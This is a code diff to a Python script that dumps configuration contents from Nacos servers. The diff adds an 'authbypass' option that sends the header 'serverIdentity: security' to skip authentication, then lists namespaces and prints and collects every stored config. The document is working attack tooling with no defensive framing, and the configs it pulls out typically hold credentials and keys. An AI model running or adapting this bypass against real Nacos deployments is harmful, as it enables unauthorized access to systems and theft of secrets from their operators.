@@ -25,17 +25,18 @@ def get_auth_token(target: str, username: str, password: str) -> str:
     return token
 
 
-def get_namespaces(target: str, token: str) -> list:
+def get_namespaces(target: str, token: str, bypass: bool) -> list:
     namespace_id = []
     path = "/v1/console/namespaces"
     url = target + path
     headers = {
-        'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Authorization': '{"accessToken":"%s":18000,"globalAdmin":false}' % token,
+        'Accept': 'application/json, text/plain, */*',
+        'Authorization': token,
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
     }
+    if bypass:
+        headers['serverIdentity'] = "security"
     params = {
-        'accessToken': token,
         'namespaceId': '',
     }
     resp = requests.get(url, headers=headers, params=params, proxies=proxy)
@@ -44,7 +45,8 @@ def get_namespaces(target: str, token: str) -> list:
     return namespace_id
 
 
-def dump_config_content(target: str, namespaces: list, token: str, count: int = 100):
+def dump_config_content(target: str, namespaces: list, token: str, bypass: bool, count: int = 100):
+    content_list = list()
     path = '/v1/cs/configs'
     url = target + path
     headers = {
@@ -52,6 +54,8 @@ def dump_config_content(target: str, namespaces: list, token: str, count: int = 
         'Accesstoken': token,
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
     }
+    if bypass:
+        headers['serverIdentity'] = "security"
     for namespace in namespaces:
         params = {
             'dataId': '',
@@ -69,8 +73,13 @@ def dump_config_content(target: str, namespaces: list, token: str, count: int = 
         for item in resp_dict['pageItems']:
             print("[+] NAMESPACE: {namespace}\n[+] CONFIG: {dataid}".format(dataid=item["dataId"], namespace=item["group"]))
             print(item['content'])
+            content_list.append(item['content'])
+    return content_list
 
-
+# def parser_config(content):
+    # # TODO
+    # for c in content:
+    #     pass
 
 def usage(name: str):
     print("""
@@ -86,6 +95,7 @@ def usage(name: str):
 Usage:
     python3 {script} <URL> <USERNAME> <PASSWORD>
     python3 {script} <URL> <TOKEN>
+    python3 {script} <URL> authbypass
 
 Example:
     python3 {script} http://localhost:8848/nacos nacos nacos
@@ -100,10 +110,16 @@ if __name__ == '__main__':
 
     target = sys.argv[1].rstrip('/')
     token = ""
-    if len(sys.argv) == 3:
+    bypass = False
+    if len(sys.argv) == 4:
         token = get_auth_token(target, sys.argv[2], sys.argv[3])
-    if len(sys.argv) == 2:
-        token = sys.argv[2]
+    if len(sys.argv) == 3:
+        if sys.argv[2] != "authbypass":
+            token = sys.argv[2]
+        else:
+            # header = { "serverIdentity": "security"}
+            bypass = True
     
-    namespaces = get_namespaces(target, token)
-    dump_config_content(target, namespaces, token)
+    namespaces = get_namespaces(target, token, bypass)
+    dump_config_content(target, namespaces, token, bypass)
+    # parser_config(dump_config_content(target, namespaces, token, bypass))
